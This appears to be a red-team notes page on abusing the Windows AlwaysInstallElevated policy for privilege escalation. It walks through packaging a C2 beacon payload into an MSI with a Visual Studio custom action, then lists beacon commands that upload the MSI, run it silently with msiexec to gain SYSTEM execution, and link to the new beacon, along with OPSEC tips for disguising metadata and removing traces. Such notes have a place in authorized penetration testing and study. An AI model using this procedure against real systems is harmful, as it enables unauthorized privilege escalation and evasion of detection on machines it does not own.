# Always Install Elevated
This policy allows standard users to install applications requiring higher permissions as the user has. This is equivalent to granting full administrative rights.

Vulnerability can be identified via [[Tools/SharpUp]]

## Exploit
Create a MSI installer containing the payload that will be installed and executed with SYSTEM privileges.

-   Generate a new TCP payload and save it to `C:\Payloads\beacon-tcp.exe`.
-   Open **Visual Studio**, select **Create a new project** and enter **installer**. Select the **Setup Wizard** project and give the project a name, like **InstallBeacon**.
-   Use a random location like `C:\Payloads`, then select **place in the same directory**, and click **Create**.
-   When prompted with the choise to include files click **Add** and select the payload (beacon-tcp.exe) and click **Finish**.
-   Highlight the **InstallBeacon** project and change the **TargetPlatform** based on the target architekture.
-   Right-click the project and select **View > Custom Actions**.
-   Right-click **Install** and select **Add Custom Action**.
-   For direct execution, double-click on **Application Folder**, select your **beacon-tcp.exe** file and click **OK**.
-   If you have selected x64 before make sure to change **Run64Bit** to **True** in the **Custom Action Properties** option.

Now build the project, which should produce an MSI at `C:\Payloads\InstallBeacon\Debug\InstallBeacon.msi`.


#opsec:
- if installed, it will appear as an installed programm.
- clone file metadata like  **Author** or **Manufacturer**.


``````beacon
beacon> cd C:\Temp
beacon> upload C:\Payloads\InstallBeacon\Debug\InstallBeacon.msi
beacon> run msiexec /i InstallBeacon.msi /q /n
beacon> connect localhost 4444
[+] established link to child beacon: 192.168.1.253
``````

#OPSEC remove the MSI afterwards, you can use `msiexec /n /q /uninstall InstallBeacon.msi` for removing the file.
